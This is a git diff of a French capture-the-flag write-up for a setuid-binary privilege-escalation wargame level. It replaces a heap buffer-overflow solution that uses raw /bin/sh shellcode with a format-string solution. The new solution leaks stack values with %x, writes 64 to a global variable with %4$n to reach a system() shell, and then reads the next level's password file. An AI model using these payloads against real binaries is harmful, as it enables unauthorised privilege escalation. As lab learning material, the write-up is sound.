@@ -1,59 +1,70 @@
 ## Comportement
 - J'ai des droits `level3` que je peux vérifier en tapant `whoami`
-- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*`
-- En exécutant le binaire (`./level2`), on observe:
+- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3*`
+- En exécutant le binaire (`./level3`), on observe:
   - qu'il attend un input de notre part.
   - qu'il print notre input avant de quitter.
-  - qu'il segfault `Segmentation fault (core dumped)` si l'input est trop long.
-
-→ Peut-être un segfault à exploiter ?
+  - il ne segfault pas meme si l'input est long.
 
 
 ## Analyse
-En analysant le binaire (`gdb ./level2`) on observe:
-- La présence d'une fonction `p()` avec un appel a `gets()`. Comme dans l'exercice précédent, la faille se trouve ici. 
+En analysant le binaire (`gdb ./level3`) on observe:
+- La présence d'une fonction `v()` avec un appel a `fgets()`: cette fonction est securisee, voila pourquoi le programme ne segfault pas. 
   ```shell
-  (gdb) disas p
+  (gdb) disas v
   ...
-  0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+  0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   ...
   ```
-- Une vérification est effectuée pour s'assurer que nous n'écrasons pas l'adresse de retour avec une adresse de la stack.
-Notre adresse de retour ne peut pas commencer par le bit 'b' (indiqué par la commande 'and' avec la valeur "0xb0000000"). 
-Elle ne peut donc pas pointer vers la stack (plage 0xbf000000 - 0xbfffffff).
+- On compare une variable globale situee a l'adresse `0x804988c` avec la valeur `0x40` (64 en hexadécimal). Si les deux valeurs sont egales le programme ouvrira un shell avec la fonction `system()`.
   ```shell
-  (gdb) disas p
+  (gdb) disas v
   ...
-  0x080484fb <+39>: and eax,0xb0000000
-  0x08048500 <+44>: cmp eax,0xb0000000
+  0x080484da <+54>:	mov    0x804988c,%eax
+  0x080484df <+59>:	cmp    $0x40,%eax
   ...
-  ```
-- On constate que le buffer est ensuite copie via la fonction `strdup()`, or elle utilise `malloc()` qui stocke sur la heap et non la stack. 
-  ``` 
-  (gdb) disas p
-  ...
-  0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+  0x08048513 <+111>:	call   0x80483c0 <system@plt>
   ...
   ```
+- Utilisation de `printf()`. Peut etre sujet a faille si mal utilise : par exemple `printf("hello")` est vulnerable alors que `print("%s", "hello")` ne l'est pas. La raison : dans la premiere version, un utilisateur peut y inscrire ce qui sera interprete par printf comme des instructions (`%s`) et il ira chercher dans la stack un parametre qui n'existe pas et nous donnera un beau segfault. Voila notre porte d'entree. Bingo Bounga ! 
+```shell
+echo "%s" | ./level3
+Segmentation fault (core dumped)
+```
 
 
 ## Résolution
-- On applique un shellcode (petit code qui permet d'ouvrir un shell interactif) et l'inscrire sur la heap. 
-Trouve [ici] (http://shell-storm.org/shellcode/files/shellcode-575.php). Il est de long de 21 bytes.
+- Avec "%x", `printf()` imprime l'adresse. Nous pouvons ainsi voir l'etat de la stack.
   ```shell
-  \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+  $ echo "%x %x %x %x" | ./level3
+  200 b7fd1ac0 b7ff37d0 25207825
   ```
-- On overwrite l'adresse de retour en utilisant un pattern generator comme [celui-ci] (https://wiremask.eu/tools/buffer-overflow-pattern-generator/) afin de trouver l'offset de l'`eip`. On voit qu'il est de 80 bytes.
-- On ajoute 59 bytes de padding (80 - 21) suivi de l'adresse du buffer dans la heap (`\x08\xb0\x04\x08`). Pour trouver celle ci on `run` le programme sous gdb en mettant un breakpoint après `strdup()`, on observe l’état du registre `eax` puisque `strdup()` y stocke l'adresse du buffer) : 
+- Nous devons voir à quelle adresse notre buffer se trouve. On teste avec "BBBB" ("42424242"). On le voit a la 4eme position.
   ```shell
-  python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload
+  $ echo "BBBB %x %x %x %x %x %x" | ./level3
+  BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825
   ```
+- Maintenant, nous devons changer cette adresse par celle de la `m` (`0x804988c`) que nous voulons overflow.
+  ```shell
+  $ python -c 'print "\x8c\x98\x04\x08" + "%x %x %x %x"' | ./level3
+  �200 b7fd1ac0 b7ff37d0 804988c
+  ```
+- En utilisant le modificateur "%n" au lieu de "%x" on ecrit une adresse au lieu de l'afficher. "%n" écrit dans l'adresse le nombre d'octets précédents.On peut specifier l'adresse ainsi `%[number]$n option`.
+```shell
+$ python -c 'print "\x8c\x98\x04\x08" + "%4$n"' | ./level3
+```
+- Maintenant, nous devons écrire un offset de 64 bytes dans "m" pour passer la condition. Il suffit donc d'ajouter 60 octets de plus au 4 bytes de l'adresse de `m`.
+```shell
+python -c 'print "\x8c\x98\x04\x08"+ "B" * 60 + "%4$n"' > /tmp/payload
+```
 - On couple l'envoi du payload avec le trick qui permet a stdin de rester open (`- |`).
   ```shell
-  cat /tmp/payload - | ./level2
+  cat /tmp/payload - | ./level3
+  �BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+  Wait what?!
   ```
-
-Il ne reste plus qu'à :
-- et passer au level3 (`su level3`) en renseignant le password obtenu plus haut.
-
-
+- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level4`.
+- Il ne reste plus qu'à :
+  - récupérer le password (`cat /home/user/level4/.pass`)
+  - quitter le shell (`exit`)
+  - et passer au level4 (`su level4`) en renseignant ce password.
